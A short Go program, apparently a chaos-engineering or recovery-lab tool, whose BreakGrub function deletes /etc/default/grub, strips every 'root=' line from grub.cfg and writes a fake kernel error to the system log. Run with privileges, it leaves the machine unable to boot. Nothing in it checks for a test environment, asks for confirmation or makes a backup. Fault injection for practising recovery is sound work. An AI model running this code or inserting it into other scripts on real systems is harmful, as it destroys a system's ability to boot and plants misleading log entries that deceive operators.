package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func BreakGrub() {
	possibleGrubDirs := []string{"/boot/grub2", "/boot/grub"}
	var grubCfgPath string

	// Try to find grub.cfg in possible locations
	for _, dir := range possibleGrubDirs {
		path := fmt.Sprintf("%s/grub.cfg", dir)
		if _, err := os.Stat(path); err == nil {
			grubCfgPath = path
			break
		}
	}

	if grubCfgPath == "" {
		grubCfgPath = "/boot/grub2/grub.cfg"
		log.Println("[chaos] No GRUB config found, defaulting to:", grubCfgPath)
	} else {
		log.Println("[chaos] Will sabotage grub.cfg at:", grubCfgPath)
	}

	// Remove /etc/default/grub
	_ = os.Remove("/etc/default/grub")

	// Remove lines containing 'root=' from grub.cfg
	if contents, err := os.ReadFile(grubCfgPath); err == nil {
		lines := strings.Split(string(contents), "\n")
		var filtered []string
		for _, line := range lines {
			if !strings.Contains(line, "root=") {
				filtered = append(filtered, line)
			}
		}
		_ = os.WriteFile(grubCfgPath, []byte(strings.Join(filtered, "\n")), 0644)
	}

	// Inject simulated kernel error into logs
	exec.Command("logger", "-p", "err", "Simulated kernel error: This is a test error for demonstration").Run()
}

func main() {
	BreakGrub()
}